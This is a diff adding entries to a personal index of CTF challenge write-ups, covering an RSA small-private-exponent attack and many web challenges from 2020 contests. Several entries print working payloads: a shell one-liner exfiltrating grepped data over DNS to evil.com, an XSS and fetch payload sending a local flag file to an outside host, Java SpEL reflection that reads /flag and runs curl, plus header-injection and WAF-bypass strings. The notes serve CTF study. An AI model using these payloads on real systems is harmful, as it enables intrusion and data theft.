@@ -1010,6 +1010,12 @@ https://ctftime.org/writeup/9412
 plaintext compressed before being encrypted -> CRIME/BREACH type attack
 https://ctftime.org/writeup/12913
 
+* easyrsa - de1ctf-2020
+howgrave-graham and seifert's attack
+2 rsa keys with same modulus, public & private exponents are big but not vuln to wiener or boneh-durfee attacks
+however if each private exponent is smaller than N*0.357 then it is vuln (e.g. private exponent must be <=731 bits for a 2048-bit N)
+https://blog.comet1337.xyz/post/de1ctf-easyrsa/
+
 # }}}
 
 # stegano {{{
@@ -2068,6 +2074,65 @@ https://eugenekolo.com/blog/nullcon-hackim-ctf-2019/#blog20solves
 * mime checkr - nullcon-hackim-ctf-2019
 phar/jpeg polyglot with ssrf
 https://eugenekolo.com/blog/nullcon-hackim-ctf-2019/#mimecheckr4solves
+
+* defiltrate - insomnihack-teaser-2020
+java deserialisation with ysoserial and Runtime.exec trick to use redirections
+sh -c $@|sh . echo echo 0 > /tmp/x; for m in $(grep -r INS /* 2>/dev/null); do echo $m.evil.com >> /tmp/x; done; dig -f /tmp/x
+https://ctftime.org/writeup/17998
+
+* inso file manager - insomnihack-teaser-2020
+forge a jwt/rsa256 token since we can upload our own pubkey as a jwk file
+https://sharkzwithlazers.pizza/posts/2020_02_filemanager_1/
+
+* bobby - tghack-2020
+sqli in password change / update query
+https://nosecurity.blog/tghackCTF2020#bobby
+
+* solar energy - nullcon-hackim-ctf-2020
+solr parameter injection, list and read files on file system to get flag
+https://ctftime.org/writeup/18451
+
+* split second - nullcon-hackim-ctf-2020
+pug command injection, encode payload in oct to bypass filter
+https://ctftime.org/writeup/18293
+
+* lateral movement - nullcon-hackim-ctf-2020
+exploit aws ec2 creds with ssrf, privesc with https://github.com/RhinoSecurityLabs/pacu
+https://graneed.hatenablog.com/entry/2020/02/09/143415
+
+* ghost - nullcon-hackim-ctf-2020
+http3
+https://graneed.hatenablog.com/entry/2020/02/09/143359
+
+* renderer - codegate-preliminary-2020
+python2 urllib header injection urlopen('http://x/y HTTP/1.1\r\nX: cve-2019-9740')
+jinja2 ssti simple payload to dump env vars
+https://ctftime.org/writeup/18354
+
+* cat web - confidence-ctf-teaser-2020
+xss json with \u0022 and file:/// (firefox-67 cve-2019-11730)
+report: file:///app/templates/index.html?foo","content":["\u0022><script src=http://example.com:1338/xs.js></script>"],"status":"ok","bar":"
+xs.js: url='http://me.com/?'; fetch('file:///app/templates/flag.txt').then(r=>r.text()).then(t=>fetch(url+btoa(t)));
+https://balsn.tw/ctf_writeup/20200314-confidencectf2020teaser/#temple-js-(unsolved)
+
+* calc - de1ctf-2020
+java spel reflection with ?c='x'.class.forName('java.lang.System').getProperties()
+'x'.class.forName('java.nio.file.Paths').get('/flag').toFile().exists()
+'x'.class.forName('java.nio.file.Files').readAllLines('x'.class.forName('java.nio.file.Paths').get('/flag'))
+'x'.class.forName("java.lang.Ru"+"ntime").getMethods()[13].invoke(
+'x'.class.forName("java.lang.Ru"+"ntime").getMethods()[17].invoke(null),
+"curl https://postb.in/..")
+https://drive.google.com/file/d/1lzLa6el8UYTqKKhnegGpS4lN7Edl7EOo/view
+
+* animal crossing - de1ctf-2020
+waf bypass with &data=;=%27||666//
+var data=''||{"valueOf":new "".constructor.constructor('return 2')}+1//'
+then some js to make admin upload flag.png as an avatar
+https://www.chainnews.com/articles/390680624719.htm
+
+* pooot - defcon-quals-2020
+register a service worker to exfil other requests issued by browser
+https://medium.com/@flohantk/pooot-writeup-217384a6b69c
 
 # }}}
 
